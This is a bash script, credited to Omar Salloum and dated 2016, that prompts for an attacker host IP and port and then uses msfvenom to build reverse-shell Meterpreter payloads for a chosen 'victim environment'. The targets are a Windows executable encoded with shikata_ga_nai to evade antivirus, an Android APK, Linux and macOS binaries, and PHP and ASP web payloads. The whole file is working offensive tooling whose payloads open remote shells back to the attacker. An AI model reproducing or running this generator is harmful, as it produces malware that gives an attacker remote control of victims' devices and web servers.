
#!/bin/bash
# Coded By Omar Salloum #
#     Date 2\10\2016    #
#########################
echo ""
echo "$( tput setaf 10)>$(tput sgr0)$(tput bold)$( tput setaf 4) What Is Your HOST IP Address ?$(tput sgr0)$(tput bold) "
read HOST
echo "$( tput setaf 10)>$(tput sgr0)$(tput bold)$( tput setaf 4) what is PORT would you like to use it (EX:443,4444,.. )$(tput sgr0)$(tput bold) "
read PORT
echo "$( tput setaf 10)>$(tput sgr0)$(tput bold)$( tput setaf 4) Enter A Payload Name :$(tput sgr0)$(tput bold)"
read NAME
sleep 1
echo " $( tput setaf 10)>$(tput sgr0)$(tput bold)$( tput setaf 4) Select A Victim Environment : $(tput sgr0)$(tput bold)"
echo " $( tput setaf 10)1 .$(tput sgr0)$(tput bold)$( tput setaf 4) Windows $(tput sgr0)$(tput bold)"
echo " $( tput setaf 10)2 .$(tput sgr0)$(tput bold)$( tput setaf 4) Android $(tput sgr0)$(tput bold)"
echo " $( tput setaf 10)3 .$(tput sgr0)$(tput bold)$( tput setaf 4) Linux $(tput sgr0)$(tput bold)"
echo " $( tput setaf 10)4 .$(tput sgr0)$(tput bold)$( tput setaf 4) Mac OS $(tput sgr0)$(tput bold)"
echo " $( tput setaf 10)5 .$(tput sgr0)$(tput bold)$( tput setaf 4) PHP Web Payload $(tput sgr0)$(tput bold)"
echo " $( tput setaf 10)6 .$(tput sgr0)$(tput bold)$( tput setaf 4) ASP Web Payload $(tput sgr0)$(tput bold)"
read number
case "$number" in 
'1') 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -b '\x00' -f raw -e x86/shikata_ga_nai -i 3 R > $NAME.exe;;
'2')
msfvenom -p android/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT R > $NAME.apk;;
'3')
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT R > $NAME.elf;;
'4')
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$HOST LPORT=$PORT -f R > $NAME.macho;;
'5')
msfvenom -p php/meterpreter_reverse_tcp LHOST=$HOST LPORT=$PORT -f raw > $NAME.php;;
'6')
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f asp > $NAME.asp
esac
echo ""
echo "$( tput setaf 10)~ Done >>$(tput sgr0)$(tput bold)$( tput setaf 4) Your Payload Was Saved In The Tool Folder .. $(tput sgr0)$(tput bold)"
echo " "
read -p "$( tput setaf 10)>$(tput sgr0)$(tput bold)$( tput setaf 4) Do You Want Create Another Payloads ? [ $( tput setaf 10)y$(tput sgr0) $(tput bold)$( tput setaf 4)/$(tput sgr0) $(tput bold)$( tput setaf 10)n $(tput sgr0)$(tput bold)$( tput setaf 4)] $(tput sgr0)$(tput bold)" choice
case "$choice" in 
  y|Y ) bash data/data.sh;;
  n|N ) bash data/han.sh ;;
  * ) echo "invalid";;
esac
